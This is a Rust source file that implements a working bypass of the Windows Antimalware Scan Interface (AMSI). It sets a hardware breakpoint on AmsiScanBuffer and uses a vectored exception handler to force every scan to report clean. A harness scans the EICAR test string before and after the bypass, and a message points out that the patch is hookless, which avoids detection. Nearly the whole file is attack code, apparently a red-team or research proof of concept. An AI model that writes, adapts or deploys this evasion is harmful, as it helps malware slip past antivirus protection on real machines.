#![allow(non_snake_case,non_camel_case_types, dead_code, unused_imports)]
#[link(name = "amsi")]
extern {}

use std::ffi::CString;
use std::ptr::null_mut;
use widestring::U16CString;
use winapi::ctypes::c_void; 

use winapi::shared::{
    ntdef::HRESULT,
    minwindef::ULONG,
};

use winapi::um::{
    errhandlingapi::AddVectoredExceptionHandler,
    libloaderapi::{GetProcAddress, GetModuleHandleA, LoadLibraryA},
    winnt::{EXCEPTION_POINTERS, CONTEXT, LONG, CONTEXT_ALL, HANDLE},
    minwinbase::EXCEPTION_SINGLE_STEP,
};

use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION,EXCEPTION_CONTINUE_SEARCH};



extern "system" {
    pub fn AmsiInitialize(appName: LPCWSTR, amsiContext: *mut HAMSICONTEXT) -> HRESULT;
    pub fn AmsiUninitialize(amsiContext: HAMSICONTEXT);
    pub fn AmsiOpenSession(amsiContext: HAMSICONTEXT, amsiSession: *mut HAMSISESSION) -> HRESULT;
    pub fn AmsiCloseSession(amsiContext: HAMSICONTEXT, amsiSession: HAMSISESSION);
    pub fn AmsiScanBuffer(
        amsiContext: HAMSICONTEXT,
        buffer: LPCVOID,
        length: ULONG,
        contentName: LPCWSTR,
        session: HAMSISESSION,
        result: *mut AMSI_RESULT
    ) -> HRESULT;
}

pub type HAMSICONTEXT = *mut c_void;
pub type HAMSISESSION = *mut c_void;
pub type AMSI_RESULT = i32;
pub type LPCWSTR = *const u16;
pub type LPCVOID = *const c_void;


const S_OK: i32 = 0;
const AMSI_RESULT_CLEAN: i32 = 0;

static mut AMSI_SCAN_BUFFER_PTR: Option<*mut u8> = None;

extern "stdcall" {

    fn NtGetContextThread(
        thread_handle: HANDLE,
        thread_context: *mut CONTEXT,
    ) -> ULONG;

    fn NtSetContextThread(
        thread_handle: HANDLE,
        thread_context: *mut CONTEXT,
    ) -> ULONG;
}


fn set_bits(dw: u64, low_bit: i32, bits: i32, new_value: u64) -> u64 {
    let mask = (1 << bits) - 1;
    (dw & !(mask << low_bit)) | (new_value << low_bit)
}

fn clear_breakpoint(ctx: &mut CONTEXT, index: i32) {
    match index {
        0 => ctx.Dr0 = 0,
        1 => ctx.Dr1 = 0,
        2 => ctx.Dr2 = 0,
        3 => ctx.Dr3 = 0,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, (index * 2) as i32, 1, 0);
    ctx.Dr6 = 0;
    ctx.EFlags = 0;
}

fn enable_breakpoint(ctx: &mut CONTEXT, address: *mut u8, index: i32) {
    match index {
        0 => ctx.Dr0 = address as u64,
        1 => ctx.Dr1 = address as u64,
        2 => ctx.Dr2 = address as u64,
        3 => ctx.Dr3 = address as u64,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, 16, 16, 0);
    ctx.Dr7 = set_bits(ctx.Dr7, (index * 2) as i32, 1, 1);
    ctx.Dr6 = 0;
}

fn get_arg(ctx: &CONTEXT, index: i32) -> usize {
    match index {
        0 => ctx.Rcx as usize,
        1 => ctx.Rdx as usize,
        2 => ctx.R8 as usize,
        3 => ctx.R9 as usize,
        _ => unsafe { *((ctx.Rsp as *const u64).offset((index + 1) as isize) as *const usize) }
    }
}

fn get_return_address(ctx: &CONTEXT) -> usize {
    unsafe { *((ctx.Rsp as *const u64) as *const usize) }
}

fn set_result(ctx: &mut CONTEXT, result: usize) {
    ctx.Rax = result as u64;
}

fn adjust_stack_pointer(ctx: &mut CONTEXT, amount: i32) {
    ctx.Rsp += amount as u64;
}

fn set_ip(ctx: &mut CONTEXT, new_ip: usize) {
    ctx.Rip = new_ip as u64;
}

unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS) -> LONG {
    unsafe {
        let exception_code = (*(*exceptions).ExceptionRecord).ExceptionCode;
        let exception_address = (*(*exceptions).ExceptionRecord).ExceptionAddress as *mut u8;

        if exception_code == EXCEPTION_SINGLE_STEP && exception_address == AMSI_SCAN_BUFFER_PTR.unwrap() {
            println!("AMSI Bypass invoked at address: {:?}", exception_address);
            
            let context = &mut *(*exceptions).ContextRecord;
            let return_address = get_return_address(context);

            let scan_result_ptr = get_arg(context, 5) as *mut i32;
            *scan_result_ptr = AMSI_RESULT_CLEAN;

            set_ip(context, return_address);
            adjust_stack_pointer(context, std::mem::size_of::<*mut u8>() as i32);
            set_result(context, S_OK as usize);

            clear_breakpoint(context, 0);

            return EXCEPTION_CONTINUE_EXECUTION;
        } else {
            return EXCEPTION_CONTINUE_SEARCH;
        }
    }
}


fn setup_amsi_bypass() -> Result<*mut c_void, String> {
    let mut thread_ctx: CONTEXT = unsafe { std::mem::zeroed() };
    thread_ctx.ContextFlags = CONTEXT_ALL;

    unsafe {
        if AMSI_SCAN_BUFFER_PTR.is_none() {
            let module_name = CString::new("amsi.dll").unwrap();

            let mut module_handle = GetModuleHandleA(module_name.as_ptr());

            // Check if amsi.dll is loaded, if not, load it
            if module_handle.is_null() {
                module_handle = LoadLibraryA(module_name.as_ptr());
                if module_handle.is_null() {
                    return Err("Failed to load amsi.dll".to_string());
                }
            }

            let function_name = CString::new("AmsiScanBuffer").unwrap();
            let amsi_scan_buffer = GetProcAddress(module_handle, function_name.as_ptr());

            if amsi_scan_buffer.is_null() {
                return Err("Failed to get address for AmsiScanBuffer".to_string());
            }

            AMSI_SCAN_BUFFER_PTR = Some(amsi_scan_buffer as *mut u8);
        }
    }

    let h_ex_handler = unsafe {
        AddVectoredExceptionHandler(1, Some(exception_handler))
    };

    if unsafe { NtGetContextThread(-2i32 as *mut c_void, &mut thread_ctx) } != 0 {
        return Err("Failed to get thread context".to_string());
    }

    enable_breakpoint(&mut thread_ctx, unsafe { AMSI_SCAN_BUFFER_PTR.unwrap() }, 0);

    if unsafe { NtSetContextThread(-2i32 as *mut c_void, &mut thread_ctx) } != 0 {
        return Err("Failed to set thread context".to_string());
    }

    Ok(h_ex_handler)
}

fn test_amsi_bypass() -> Result<(), String> {
    // Initialize AMSI
    let mut amsi_context = null_mut();
    let mut amsi_session = null_mut();
    // Initialize AMSI with a wide string
    let app_name = U16CString::from_str("TestApp").unwrap();
    let result: HRESULT = unsafe { AmsiInitialize(app_name.as_ptr(), &mut amsi_context) };

    if result != S_OK {
        return Err("Failed to initialize AMSI".to_string());
    }

    // Open AMSI session
    unsafe { AmsiOpenSession(amsi_context, &mut amsi_session) };

    // Known malicious string (this is just an example, not actual malware)
    let malicious_string = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    // Use *const c_void for the buffer and use a wide string for content name
    let mut result_before_bypass = 0;
    let content_name_before = U16CString::from_str("TestContent").unwrap(); // Using U16CString for wide string
    unsafe {
        AmsiScanBuffer(
            amsi_context,
            malicious_string.as_ptr() as *const c_void,  // Corrected type
            malicious_string.len() as u32,
            content_name_before.as_ptr(),  // Corrected type
            amsi_session,
            &mut result_before_bypass
        );
    }

    println!("Result before bypass: {}", result_before_bypass);
    if result_before_bypass == AMSI_RESULT_CLEAN {
        println!("AMSI did not detect the string as malicious before bypass. Test might be invalid.");
    } else {
        println!("AMSI detected the string as malicious before bypass.");
    }

    // Set up the AMSI bypass
    match setup_amsi_bypass() {
        Ok(_) => println!("AMSI bypass successfully set up."),
        Err(err_msg) => return Err(err_msg),
    }

    let mut result_after_bypass = 0;
    let content_name_after = U16CString::from_str("TestContent").unwrap(); // Using U16CString for wide string again
    unsafe {
        AmsiScanBuffer(
            amsi_context,
            malicious_string.as_ptr() as *const c_void,  // Corrected type
            malicious_string.len() as u32,
            content_name_after.as_ptr(),  // Corrected type
            amsi_session,
            &mut result_after_bypass
        );
    }

    println!("Result after bypass: {}", result_after_bypass);
    if result_after_bypass == AMSI_RESULT_CLEAN {
        println!("AMSI did not detect the string as malicious after bypass.");
    } else {
        println!("AMSI still detected the string as malicious after bypass. Bypass might not have worked.");
    }

    // Close AMSI session and uninitialize
    unsafe {
        AmsiCloseSession(amsi_context, amsi_session);
        AmsiUninitialize(amsi_context);
    }

    Ok(())
}



#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<String> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(buf.trim().to_string())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    println!("Scan the pocess with PE-SIEVE to see if the Any hooks on ;)"); // Message to the user
    match get_input() {
        Ok(_) => {}, // Do nothing with the buffer
        Err(error) => println!("Error reading input: {}", error),
    };
}

fn main() {
    match test_amsi_bypass() {
        Ok(_) => {
            println!("Verification complete.");
            pause();
        },
        Err(err_msg) => {
            println!("Error during verification: {}", err_msg);
        }
    }
}

